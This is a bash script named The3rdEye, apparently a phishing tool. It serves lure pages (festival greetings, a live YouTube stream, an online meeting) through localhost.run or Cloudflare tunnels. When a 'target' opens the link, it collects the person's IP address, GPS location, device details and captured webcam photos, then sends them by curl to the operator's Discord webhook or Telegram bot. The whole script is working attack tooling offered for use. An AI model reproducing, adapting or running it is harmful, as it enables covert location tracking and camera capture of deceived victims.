#!/bin/bash
# The3rdEye v1.0
# Made by r4tur1

trap 'printf "\n\e[1;91m[!] Interrupt received. Shutting down...\e[0m\n";stop' 2

# Color palette used: Blood Red
R='\e[1;91m'   # Bright Red
W='\e[1;97m'   # White
Y='\e[1;93m'   # Yellow
G='\e[1;92m'   # Green
BOLD='\e[1m'
RESET='\e[0m'

# Global Config
DEFAULT_PORT=8080
CAPTURE_INTERVAL=0.1 # Interval in seconds to check for new captures change here for faster/slower checks
FALLBACK_TIMEOUT=20 # Timeout in seconds for fallback mechanisms
CONFIG_DIR="$HOME/.the3rdeye"
CONFIG_FILE="$CONFIG_DIR/config.ini"
CAPTURE_DIR="$CONFIG_DIR/captures"
LOG_FILE="$CONFIG_DIR/the3rdeye.log"

# Discord/Telegram Config Storage
DISCORD_WEBHOOK=""
TELEGRAM_BOT_TOKEN=""
TELEGRAM_CHAT_ID=""
#can change here directly as well but the user is prompted to enter these on first run
banner() {
clear
printf "${R}"
cat << "EOF"
___________.__           ________           .______________             
\__    ___/|  |__   ____ \_____  \______  __| _/\_   _____/__.__. ____  
  |    |   |  |  \_/ __ \  _(__  <_  __ \/ __ |  |    __)<   |  |/ __ \ 
  |    |   |   Y  \  ___/ /       \  | \/ /_/ |  |        \___  \  ___/ 
  |____|   |___|  /\___  >______  /__|  \____ | /_______  / ____|\___  >
                \/     \/       \/           \/         \/\/         \/ 
EOF
printf "${RESET}"
printf "${R}                            The3rdEye Ver 1.0 ${RESET}\n"
printf "${W}                          github.com/r4tur1/The3rdEye${RESET}\n"
printf "\n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "${R}[!] PHP is required but not installed. Aborting.${RESET}"; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "${R}[!] wget is required but not installed. Aborting.${RESET}"; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "${R}[!] curl is required but not installed. Aborting.${RESET}"; exit 1; }
    command -v ssh > /dev/null 2>&1 || { echo >&2 "${R}[!] ssh client is required for Localhost.run. Aborting.${RESET}"; exit 1; }
    command -v unzip > /dev/null 2>&1 || { echo >&2 "${R}[!] unzip is required but not installed. Aborting.${RESET}"; exit 1; }
}

init_config() {
    if [[ ! -d "$CONFIG_DIR" ]]; then
        mkdir -p "$CONFIG_DIR"
    fi
    if [[ ! -d "$CAPTURE_DIR" ]]; then
        mkdir -p "$CAPTURE_DIR"
    fi
    if [[ ! -f "$CONFIG_FILE" ]]; then
        touch "$CONFIG_FILE"
    fi
}

setup_webhooks() {
    printf "\n${R}[+]${W} First-Time Webhook Setup${RESET}\n"
    printf "${R}[+]${W} Leave blank and press Enter to skip any service.${RESET}\n\n"

    read -p $'\e[1;91m[?]\e[0m\e[1;97m Enter your Discord Webhook URL: \e[0m' DISCORD_WEBHOOK_INPUT
    if [[ -n "$DISCORD_WEBHOOK_INPUT" ]]; then
        DISCORD_WEBHOOK="$DISCORD_WEBHOOK_INPUT"
        echo "DISCORD_WEBHOOK=\"$DISCORD_WEBHOOK\"" >> "$CONFIG_FILE"
        printf "${G}[✓] Discord Webhook saved.${RESET}\n"
    else
        printf "${Y}[!] Discord Webhook skipped.${RESET}\n"
    fi

    printf "\n${R}--- Telegram Bot Setup ---${RESET}\n"
    printf "${W}Step 1: Create a bot on Telegram by messaging @BotFather and use the /newbot command.${RESET}\n"
    printf "${W}Step 2: Copy the HTTP API token BotFather gives you.${RESET}\n"
    printf "${W}Step 3: Start a chat with your bot, then message @getidsbot to get your Chat ID.${RESET}\n\n"

    read -p $'\e[1;91m[?]\e[0m\e[1;97m Enter your Telegram Bot Token: \e[0m' TELEGRAM_BOT_TOKEN_INPUT
    if [[ -n "$TELEGRAM_BOT_TOKEN_INPUT" ]]; then
        TELEGRAM_BOT_TOKEN="$TELEGRAM_BOT_TOKEN_INPUT"
        echo "TELEGRAM_BOT_TOKEN=\"$TELEGRAM_BOT_TOKEN\"" >> "$CONFIG_FILE"
        read -p $'\e[1;91m[?]\e[0m\e[1;97m Enter your Telegram Chat ID: \e[0m' TELEGRAM_CHAT_ID_INPUT
        if [[ -n "$TELEGRAM_CHAT_ID_INPUT" ]]; then
            TELEGRAM_CHAT_ID="$TELEGRAM_CHAT_ID_INPUT"
            echo "TELEGRAM_CHAT_ID=\"$TELEGRAM_CHAT_ID\"" >> "$CONFIG_FILE"
            printf "${G}[✓] Telegram Bot Token and Chat ID saved.${RESET}\n"
        else
            printf "${Y}[!] Telegram Chat ID skipped.${RESET}\n"
        fi
    else
        printf "${Y}[!] Telegram setup skipped.${RESET}\n"
    fi
}

load_config() {
    if [[ -f "$CONFIG_FILE" ]]; then
        source "$CONFIG_FILE"
    fi
}

send_discord() {
    if [[ -z "$DISCORD_WEBHOOK" ]]; then
        return
    fi
    local message="$1"
    curl -s -H "Content-Type: application/json" -X POST -d "{\"content\": \"@everyone $message\"}" "$DISCORD_WEBHOOK" > /dev/null 2>&1
    if [[ -f "$2" ]]; then
        curl -s -F "file=@$2" "$DISCORD_WEBHOOK" > /dev/null 2>&1
    fi
}

send_telegram() {
    if [[ -z "$TELEGRAM_BOT_TOKEN" ]] || [[ -z "$TELEGRAM_CHAT_ID" ]]; then
        return
    fi
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d "chat_id=$TELEGRAM_CHAT_ID&text=$message" > /dev/null 2>&1
    if [[ -f "$2" ]]; then
        curl -s -F "chat_id=$TELEGRAM_CHAT_ID" -F "photo=@$2" "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendPhoto" > /dev/null 2>&1
    fi
}

stop() {
    printf "\n${R}[!] Terminating all processes...${RESET}\n"
    killall php > /dev/null 2>&1
    killall cloudflared > /dev/null 2>&1
    killall ssh > /dev/null 2>&1
    rm -rf .cloudflared.log .tunnel.log > /dev/null 2>&1
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "${R}[+]${W} IP Captured: %s${RESET}\n" $ip
    echo "$ip" >> "$CONFIG_DIR/saved_ips.txt"
}

catch_location() {
    if [[ -e "current_location.txt" ]]; then
        printf "${R}[+]${W} GPS Location Data Received:${RESET}\n"
        grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
        mv current_location.txt "$CAPTURE_DIR/location_$(date +%Y%m%d_%H%M%S).txt"
    fi
}

notify_capture() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local ip=$(cat "$CONFIG_DIR/saved_ips.txt" 2>/dev/null | tail -n 1)
    local device=$(cat user_agent.txt 2>/dev/null)
    local message="[The3rdEye] New Capture!
    Timestamp: $timestamp
    IP: ${ip:-Unknown}
    Device: ${device:-Unknown}"

    send_discord "$message" "$1"
    send_telegram "$message" "$1"
}

checkfound() {
    printf "\n${R}[*]${W} Waiting for targets... Press Ctrl + C to exit${RESET}\n"
    printf "${R}[*]${W} GPS Location tracking is ${G}ACTIVE${RESET}\n"
    printf "${R}[*]${W} Capture interval: ${CAPTURE_INTERVAL}s${RESET}\n"
    if [[ -n "$DISCORD_WEBHOOK" ]]; then
        printf "${R}[*]${W} Discord integration: ${G}ENABLED${RESET}\n"
    fi
    if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
        printf "${R}[*]${W} Telegram integration: ${G}ENABLED${RESET}\n"
    fi

    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n${R}[+]${W} Target opened the link!${RESET}\n"
            catch_ip
            rm -rf ip.txt
        fi

        if [[ -e "current_location.txt" ]]; then
            printf "\n${R}[+]${W} Location data received!${RESET}\n"
            catch_location
        fi

        if [[ -e "Log.log" ]]; then
            printf "${R}[+]${W} Photo captured!${RESET}\n"
            local latest_photo=$(ls -t captured_*.png 2>/dev/null | head -n 1)
            notify_capture "$latest_photo"
            rm -rf Log.log
        fi

        sleep $CAPTURE_INTERVAL
    done
}

download_cloudflared() {
    if [[ -e cloudflared ]]; then
        return
    fi
    printf "\n${R}[+]${W} Downloading Cloudflared...${RESET}\n"
    arch=$(uname -m)
    case "$arch" in
        "x86_64")
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
        "aarch64"|"arm64")
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1 ;;
        "armv7l"|"arm")
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1 ;;
        *)
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
    esac
    chmod +x cloudflared
}

localhostrun_tunnel() {
    printf "\n${R}[+]${W} Starting PHP server on port ${PORT}...${RESET}\n"
    php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
    sleep 2

    printf "${R}[+]${W} Starting Localhost.run tunnel...${RESET}\n"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 80:localhost:$PORT nokey@localhost.run > .tunnel.log 2>&1 &
    local ssh_pid=$!

    printf "${R}[*]${W} Waiting for tunnel link (timeout: ${FALLBACK_TIMEOUT}s)...${RESET}\n"
    local count=0
    while [[ $count -lt $FALLBACK_TIMEOUT ]]; do
        link=$(grep -o 'https://[-0-9a-z]*\.lhr\.life' .tunnel.log 2>/dev/null | head -n1)
        if [[ -n "$link" ]]; then
            printf "${G}[✓]${W} Localhost.run Link: %s${RESET}\n" "$link"
            payload_setup "$link"
            checkfound
            return
        fi
        sleep 1
        ((count++))
    done

    printf "${R}[!] Localhost.run failed after ${FALLBACK_TIMEOUT}s. Falling back to Cloudflare Tunnel...${RESET}\n"
    kill $ssh_pid > /dev/null 2>&1
    killall php > /dev/null 2>&1
    sleep 1
    cloudflare_tunnel
}

cloudflare_tunnel() {
    download_cloudflared
    printf "\n${R}[+]${W} Starting PHP server on port ${PORT}...${RESET}\n"
    php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
    sleep 2

    printf "${R}[+]${W} Starting Cloudflare Tunnel...${RESET}\n"
    rm -rf .cloudflared.log
    ./cloudflared tunnel -url 127.0.0.1:$PORT --logfile .cloudflared.log > /dev/null 2>&1 &

    sleep 10
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log" 2>/dev/null)
    if [[ -z "$link" ]]; then
        printf "${R}[!] Direct link generation failed. Check your internet connection.${RESET}\n"
        printf "${R}[*] Try running manually: ./cloudflared tunnel --url 127.0.0.1:$PORT${RESET}\n"
        exit 1
    else
        printf "${G}[✓]${W} Cloudflare Link: %s${RESET}\n" "$link"
    fi
    payload_setup "$link"
    checkfound
}

payload_setup() {
    local link=$1
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
    fi
    rm -rf index3.html
}

select_template() {
    printf "\n${R}-----Choose a Template-----${RESET}\n"
    printf "${R}[01]${W} Festival Wishing${RESET}\n"
    printf "${R}[02]${W} Live YouTube TV${RESET}\n"
    printf "${R}[03]${W} Online Meeting [Beta]${RESET}\n"
    default_option_template="1"
    read -p $'\n\e[1;91m[+]\e[0m\e[1;97m Choose a template [Default: 1]: \e[0m' option_tem
    option_tem="${option_tem:-${default_option_template}}"

    if [[ $option_tem -eq 1 ]]; then
        read -p $'\e[1;91m[+]\e[0m\e[1;97m Enter festival name: \e[0m' fest_name
        fest_name="${fest_name//[[:space:]]/}"
    elif [[ $option_tem -eq 2 ]]; then
        read -p $'\e[1;91m[+]\e[0m\e[1;97m Enter YouTube Video Watch ID: \e[0m' yt_video_ID
    elif [[ $option_tem -eq 3 ]]; then
        printf ""
    else
        printf "${R}[!] Invalid template option!${RESET}\n"
        sleep 1
        select_template
    fi
}

the3rdeye() {
    printf "\n${R}-----Choose Tunnel Server-----${RESET}\n"
    printf "${R}[01]${W} Localhost.run (Primary)${RESET}\n"
    printf "${R}[02]${W} Cloudflare Tunnel${RESET}\n"
    default_option_server="1"
    read -p $'\n\e[1;91m[+]\e[0m\e[1;97m Choose a Port Forwarding option [Default: 1]: \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"

    read -p $'\e[1;91m[+]\e[0m\e[1;97m Enter local port to use [Default: 8080]: \e[0m' PORT
    PORT="${PORT:-${DEFAULT_PORT}}"

    select_template

    if [[ $option_server -eq 2 ]]; then
        cloudflare_tunnel
    elif [[ $option_server -eq 1 ]]; then
        localhostrun_tunnel
    else
        printf "${R}[!] Invalid option!${RESET}\n"
        sleep 1
        the3rdeye
    fi
}

# MAIN EXECUTION
banner
dependencies
init_config
load_config

# Check if webhooks are configured, if not, run setup
if [[ -z "$DISCORD_WEBHOOK" ]] && [[ -z "$TELEGRAM_BOT_TOKEN" ]]; then
    setup_webhooks
    load_config
fi

the3rdeye